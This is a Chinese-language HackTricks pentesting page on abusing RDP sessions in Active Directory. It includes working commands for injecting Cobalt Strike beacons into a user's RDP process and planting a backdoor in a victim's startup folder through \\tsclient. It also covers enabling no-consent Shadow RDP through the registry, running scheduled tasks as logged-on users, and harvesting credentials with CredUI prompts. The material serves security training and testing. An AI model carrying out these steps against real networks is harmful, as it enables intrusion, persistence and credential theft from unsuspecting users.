# 滥用 RDP 会话

{{#include ../../banners/hacktricks-training.md}}

## RDP 进程注入

如果**外部组**对当前域中的某台**计算机**拥有 **RDP 访问权限**，攻击者在攻陷该计算机后，可以等待该组成员连接。

用户通过 RDP 连接后，**攻击者可以 pivot 到该用户的会话**，并滥用该用户在外部域中的权限。

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

查看**使用其他工具窃取会话的其他方法**[**请见此页面。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## 跨会话身份验证 Relay

如果你在同一主机上拥有低权限 shell，另一域用户的**活动控制台或 RDP 会话**也可能是一个突破口。DCOM 跨会话激活可能会使该交互会话中的合适 COM 服务器进行身份验证，而 RemotePotato0 或 KrbRelay 等工具可以捕获或中继该身份验证。已登录用户不必是域管理员：某项范围有限的目录权限（例如读取 gMSA 托管密码的权限）就足以实现进一步 pivot。<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

先通过 `query user`、`qwinsta` 或现有的 winPEAS 会话清单获取会话 ID 和身份信息。应将其视为**候选线索**，而非中继路径存在的证明。COM 类、其模拟级别和身份验证级别、会话可访问性、防火墙/OXID 路由、目标协议保护，以及已登录主体的有效权限都会产生影响。KrbRelay 文档介绍了跨会话 LDAP、HTTP、SMB 和 NTLM 示例，但这些路径取决于版本和配置。LDAP channel binding 也是目标端的一道中继屏障。尤其是，RemotePotato0 项目指出，其最初的 RPC 到 LDAP exploit 场景已于 2022 年修复；不要仅凭看到一个会话就推断 LDAP 中继会成功。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

如果用户通过 **RDP 访问一台机器**，而**攻击者**正在那里**等待**，攻击者就能够**在用户的 RDP 会话中注入 beacon**。如果**受害者在通过 RDP 访问时挂载了自己的驱动器**，**攻击者就可以访问该驱动器**。

在这种情况下，你只需在**受害者的** **原始计算机**上写入一个 **backdoor**，即可**攻陷**该计算机，并将其放入**启动文件夹**。

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

如果你在受害者已拥有**活动 RDP 会话**的主机上是**本地管理员**，则可能无需窃取密码或转储 LSASS，就能**查看/控制该桌面**。<sup>[[1]](#references)</sup>

这取决于存储在以下位置的 **Remote Desktop Services shadowing** 策略：<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

有趣的值：

- `0`：已禁用
- `1`：`EnableInputNotify`（控制，需要用户批准）
- `2`：`EnableInputNoNotify`（控制，**无需用户批准**）
- `3`：`EnableNoInputNotify`（仅查看，需要用户批准）
- `4`：`EnableNoInputNoNotify`（仅查看，**无需用户批准**）

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

当特权用户通过 RDP 连接后，留下未锁定的桌面、KeePass 会话、MMC 控制台、浏览器会话或管理员 shell 处于打开状态时，这尤其有用。

## 以已登录用户身份运行计划任务

如果你是**本地管理员**，且目标用户**当前已登录**，Task Scheduler 可以**在不需要其密码的情况下，以该用户身份启动代码**。<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

这会将受害者现有的登录会话变成一个执行原语：

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

备注：

- 如果用户**未登录**，Windows 通常要求提供密码，才能创建以该用户身份运行的任务。
- 如果用户**已登录**，任务可以重用现有的登录上下文。
- 这是一种实用的方法，可在受害者会话中执行 GUI 操作或启动二进制文件，而无需接触 LSASS。

## 在受害者会话中滥用 CredUI 提示

只要能够在**受害者的交互式桌面中**执行操作（例如通过 **Shadow RDP** 或**以该用户身份运行的计划任务**），就可以使用 CredUI API 显示**真实的 Windows 凭据提示**，并收集受害者输入的凭据。<sup>[[1]](#references)</sup>

相关 API：

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

典型流程：

1. 在受害者会话中启动一个二进制文件。
2. 显示与当前域品牌相符的域身份验证提示。
3. 解包返回的身份验证缓冲区。
4. 验证提供的凭据，并可选择持续提示，直到输入有效凭据。

这适用于**主机内钓鱼**，因为该提示由标准 Windows API 呈现，而不是伪造的 HTML 表单。

## 在受害者上下文中请求 PFX

同样的**以用户身份运行计划任务**原语，可用于以已登录受害者的身份请求**证书/PFX**。之后可以使用该证书以该用户身份进行 **AD 身份验证**，完全避免窃取密码。<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

高级流程：

1. 在受害者已登录的主机上获取**本地管理员**权限。
2. 使用**计划任务**以受害者身份运行证书注册/导出逻辑。
3. 导出生成的 **PFX**。
4. 使用该 PFX 进行 PKINIT / 基于证书的 AD 身份验证。

后续滥用方法请参阅 AD CS 页面：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - 从扁平网络到采用分层模型锁定域](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc` 影子会话选项](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDP 插件 PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as 模块](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - 通过计划任务请求 PFX 的 PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - 跨会话 DCOM 激活及当前限制](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - 跨会话中继示例和 CLSID 要求](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query session 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding 和中继防护](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
